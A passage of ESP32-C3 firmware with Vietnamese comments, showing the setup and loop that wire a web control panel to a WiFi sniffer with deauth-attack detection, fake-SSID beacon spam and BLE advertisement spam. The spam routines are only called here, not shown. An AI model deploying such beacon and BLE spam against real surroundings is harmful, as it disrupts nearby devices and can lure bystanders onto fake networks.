// ============================================
// PHẦN 10: SETUP & LOOP
// ============================================

void setup() {
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);

  Serial.println("========================================");
  Serial.println("ESP32-C3 - Giám sát mạng + Spam");
  Serial.println("========================================");
  
  // Khởi tạo WiFi AP
  WiFi.softAP(AP_SSID, AP_PASS);
  Serial.print("Địa chỉ IP: ");
  Serial.println(WiFi.softAPIP());

  // Khởi tạo WiFi Sniffer
  wifi_sniffer_init();

  // Thêm vài WiFi ảo mặc định (có thể xóa sau)
  addBeaconSSID("Free_WiFi");
  addBeaconSSID("WiFi_Cong_Cong");
  addBeaconSSID("Mang_Mien_Phi");

  // Setup Web Server
  server.on("/", handleRoot);
  server.on("/setchannel", handleSetChannel);
  server.on("/addssid", handleAddSSID);
  server.on("/clearssid", handleClearSSID);
  server.on("/startbeacon", handleStartBeacon);
  server.on("/stopbeacon", handleStopBeacon);
  server.on("/startble", handleStartBLE);
  server.on("/stopble", handleStopBLE);
  server.begin();

  Serial.println("Hệ thống sẵn sàng!");
  Serial.println("Kết nối WiFi: " + String(AP_SSID));
  Serial.println("Mật khẩu: " + String(AP_PASS));
  Serial.println("Mở trình duyệt: http://" + WiFi.softAPIP().toString());
  Serial.println("========================================");
}

void loop() {
  server.handleClient();
  
  // LED blink khi phát hiện deauth
  if (millis() - last_deauth < 5000) {
    digitalWrite(LED_BUILTIN, millis() % 200 < 100 ? HIGH : LOW);
  } else {
    digitalWrite(LED_BUILTIN, LOW);
  }

  // Spam WiFi ảo
  if (beacon_spamming) {
    BeaconSpamLoop();
  }

  // Spam BLE
  if (ble_spamming) {
    BLE_SpamLoop();
  }

  // Periodic serial output
  static unsigned long last_print = 0;
  if (millis() - last_print > SERIAL_OUTPUT_INTERVAL) {
    Serial.printf("Mạng: %d | Tấn công: %d | Kênh: %d | WiFi ảo: %d | BLE: %s\n", 
                  networkCount, deauth_count, current_channel, 
                  beacon_count, ble_spamming ? "Đang chạy" : "Dừng");
    last_print = millis();
  }
  
  delay(10);
}